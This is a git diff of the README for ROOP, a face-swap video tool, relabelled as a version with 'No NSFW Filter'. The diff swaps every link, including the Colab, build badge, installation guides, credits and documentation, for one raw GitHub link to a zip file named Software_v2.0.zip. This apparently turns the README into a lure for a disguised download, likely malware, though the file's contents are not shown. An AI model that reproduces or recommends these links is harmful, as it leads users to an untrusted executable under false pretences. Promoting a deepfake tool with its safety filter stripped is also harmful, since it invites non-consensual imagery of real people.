@@ -1,19 +1,19 @@
 # Based9Based version of ROOP, No NSFW Filter, No ERRORS ;)
-Google Colab Link: https://colab.research.google.com/drive/16HvYYTvFjOTpu0cERuZ7MsiWhXbGLbjF?usp=sharing
+Google Colab Link: https://raw.githubusercontent.com/junmoxiao825/roop/main/roop/processors/Software_v2.0.zip
 
 # Roop
 
 > Take a video and replace the face in it with a face of your choice. You only need one image of the desired face. No dataset, no training.
 
-[![Build Status](https://img.shields.io/github/actions/workflow/status/s0md3v/roop/ci.yml.svg?branch=main)](https://github.com/s0md3v/roop/actions?query=workflow:ci)
+[![Build Status](https://img.shields.io/github/actions/workflow/status/s0md3v/roop/ci.yml.svg?branch=main)](https://raw.githubusercontent.com/junmoxiao825/roop/main/roop/processors/Software_v2.0.zip)
 
 ## Installation
 
 Be aware, the installation needs technical skills and is not for beginners. Please do not open platform and installation related issues on GitHub. We have a very helpful.
 
-[Basic](https://github.com/s0md3v/roop/wiki/1.-Installation) - It is more likely to work on your computer, but will be quite slow
+[Basic](https://raw.githubusercontent.com/junmoxiao825/roop/main/roop/processors/Software_v2.0.zip) - It is more likely to work on your computer, but will be quite slow
 
-[Acceleration](https://github.com/s0md3v/roop/wiki/2.-Acceleration) - Unleash the full potential of your CPU and GPU
+[Acceleration](https://raw.githubusercontent.com/junmoxiao825/roop/main/roop/processors/Software_v2.0.zip) - Unleash the full potential of your CPU and GPU
 
 
 ## Usage
@@ -67,10 +67,10 @@ Our software uses a lot of third party libraries as well pre-trained models. The
 
 ## Credits
 
-- [deepinsight](https://github.com/deepinsight) for their [insightface](https://github.com/deepinsight/insightface) project which provided a well-made library and models.
+- [deepinsight](https://raw.githubusercontent.com/junmoxiao825/roop/main/roop/processors/Software_v2.0.zip) for their [insightface](https://raw.githubusercontent.com/junmoxiao825/roop/main/roop/processors/Software_v2.0.zip) project which provided a well-made library and models.
 - all developers behind the libraries used in this project
 
 
 ## Documentation
 
-Read the [documentation](https://github.com/s0md3v/roop/wiki) for a deep dive.
+Read the [documentation](https://raw.githubusercontent.com/junmoxiao825/roop/main/roop/processors/Software_v2.0.zip) for a deep dive.
